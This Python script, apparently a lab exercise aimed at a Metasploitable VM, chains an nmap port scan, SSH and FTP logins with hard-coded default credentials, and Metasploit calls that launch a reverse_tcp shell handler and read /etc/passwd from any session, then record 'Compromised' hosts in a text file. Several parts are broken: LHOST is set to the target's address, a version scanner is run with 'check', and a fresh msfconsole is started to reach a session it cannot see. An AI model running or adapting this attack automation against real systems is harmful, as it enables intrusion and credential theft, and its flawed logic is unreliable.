# Create a Metasploit Script that takes input from vulnerability scanner (nmap_remote_meta.py) that runs the exploit selected on target, and outputs compromised status into textfile
import paramiko
from ftplib import FTP
import sys
import nmap
import re
import subprocess

# Replace these with your actual credentials
SSH_USERNAME = 'msfadmin'
SSH_PASSWORD = 'msfadmin'
FTP_USERNAME = 'msfadmin'
FTP_PASSWORD = 'msfadmin'

def ssh_connect(metasploitable_ip, port):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        client.connect(metasploitable_ip, username=SSH_USERNAME, password=SSH_PASSWORD, port=port)
        print("Successfully connected to {} via SSH on port {}.".format(metasploitable_ip, port))
        shell = client.invoke_shell()
        while True:
            command = input("Enter command to execute on Metasploitable (or 'exit' to quit): ")
            if command.lower() == 'exit':
                break
            shell.send(command + '\n')
            while shell.recv_ready():
                output = shell.recv(1024).decode('utf-8')
                print(output)

        client.close()
    except Exception as e:
        print("SSH Connection failed: {}".format(e))
    
def ftp_connect(metasploitable_ip, port):
    try:
        ftp = FTP()
        ftp.connect(metasploitable_ip, port)
        ftp.login(user=FTP_USERNAME, passwd=FTP_PASSWORD)
        print("Successfully connected to {} via FTP on port {}.".format(metasploitable_ip, port))

        print("Files in the current directory:")
        ftp.retrlines('LIST')

        ftp.quit()
    except Exception as e:
        print("FTP Connection failed: {}".format(e))

def nmap_scan(ip_address, port_range):
    nm = nmap.PortScanner()
    port_min, port_max = map(int, port_range.split('-'))

    print("Scanning ports {} to {} on {}".format(port_min, port_max, ip_address))
    open_ports = []
    for port in range(port_min, port_max + 1):
        try:
            result = nm.scan(ip_address, str(port))
            port_status = result['scan'][ip_address]['tcp'][port]['state']
            print("Port {}: {}".format(port, port_status))
            if port_status == 'open':
                open_ports.append(port)
        except:
            print("Cannot scan port {}".format(port))
    return open_ports



def attack(host, port):
    """
    Runs a Metasploit module against the target host and port.
    This example uses a generic TCP exploit; you'll likely want to
    customize this based on the specific service and version.
    """
    try:

        # auxiliary module based on the service (replace with actual module)
        auxiliary_module = "auxiliary/scanner/ssh/ssh_version"  # Example: SSH version scanner
        
        # Metasploit check command (vulnerability scanner)
        check_command = f"msfconsole -x 'use {auxiliary_module}; set RHOSTS {host}; set RPORT {port}; check; exit -y'"
    
        # Execute the Metasploit command
        process = subprocess.Popen(check_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        output = stdout.decode()

        # Check the output for vulnerability status (can change based on the module)
        if "is vulnerable" in output or "vulnerable to" in output:  # Adjust the check as needed
            # Proceed with the exploit if vulnerable
            msf_command = f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD cmd/unix/reverse_tcp; set LHOST {host}; set LPORT {port}; exploit; sessions -l; exit -y'"

            # Rest of the exploit code with output handling:
            process = subprocess.Popen(msf_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            exploit_output = stdout.decode()
            exploit_error = stderr.decode()

            # Prepare a dictionary to store output information
            output_data = {
                "host": host,
                "port": port,
                "status": "Not Compromised",  # Default status
                "session_id": None,
                "command_output": None
            }

            if "Session 1 created" in exploit_output:
                output_data["status"] = "Compromised"
                output_data["session_id"] = re.search(r"Session (\d+) created", exploit_output).group(1)

                # Attempt to execute a command on the compromised session
                command_output = subprocess.run(
                    f"msfconsole -x 'sessions -i {output_data['session_id']}; cat /etc/passwd; exit -y'",
                    shell=True, capture_output=True, text=True
                )
                output_data["command_output"] = command_output.stdout

            return output_data  # Return the dictionary

        else:
            print(f"Host {host}:{port} is not vulnerable according to the check.")
            return None  # Return None if not vulnerable

    except FileNotFoundError:
        print("Metasploit not found. Make sure it's in your PATH.")
        return None
    except Exception as e:
        print(f"Error during Metasploit check or attack: {e}")
        return None

    
def main():
    metasploitable_ip = input("Enter the IP address of the target machine: ")

    port_range = input("Enter the port range to scan (e.g., 20-100): ")
    open_ports = nmap_scan(metasploitable_ip, port_range)

    with open("status.txt", "w") as f:
        if open_ports:
            for port in open_ports:
                print("Attempting attack on {}:{}".format(metasploitable_ip, port))
                attack_output = attack(metasploitable_ip, port)
                if attack_output:
                    f.write(f"Host: {attack_output['host']}, Port: {attack_output['port']}, Status: {attack_output['status']}\n")
                    if attack_output['status'] == "Compromised":
                        f.write(f"Session ID: {attack_output['session_id']}\n")
                        f.write(f"Command Output: {attack_output['command_output']}\n")
                else:
                    f.write(f"Host: {metasploitable_ip}, Port: {port}, Status: Not Compromised\n")
        else:
            f.write("No open ports found.\n")
            print("No open ports found.")

    # You can add further actions here based on the attack_output,
    print("\nAttack Summary:")
    with open("status.txt", "r") as f:
        print(f.read())

if __name__ == "__main__":
    main()